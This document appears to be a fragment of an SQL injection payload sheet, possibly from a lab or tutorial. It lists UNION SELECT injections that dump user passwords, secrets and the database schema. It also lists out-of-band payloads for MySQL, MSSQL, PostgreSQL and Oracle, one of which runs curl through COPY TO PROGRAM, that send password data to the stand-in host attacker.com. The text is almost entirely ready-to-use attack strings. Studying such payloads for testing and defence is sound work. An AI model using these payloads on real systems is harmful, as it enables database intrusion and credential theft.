1 UNION SELECT id, 'EXFIL_' || username, password, 'data_exfil' FROM users
Extract secrets/flags into the result set
1 UNION SELECT id, 'SECRET_' || secret_key, secret_value, 'exfiltrated' FROM secrets
Dump all table schemas (schema exfiltration)
1 UNION SELECT rowid, type, name || ': ' || sql, 'schema' FROM sqlite_master WHERE sql IS NOT NULL
🌐 Real-World OOB Examples

Other database systems have native OOB capabilities:

MySQL:
1 AND LOAD_FILE(CONCAT('\\attacker.com\', (SELECT password FROM users LIMIT 1), '.dns.log'))
MSSQL:
1; EXEC master..xp_dirtree '\\attacker.com\test' --
PostgreSQL:
1; COPY (SELECT password FROM users) TO PROGRAM 'curl attacker.com/?d=' || password --
Oracle:
1 AND UTL_HTTP.request('http://attacker.com/' || (SELECT password FROM users WHERE ROWNUM=1)) IS NOT NULL --
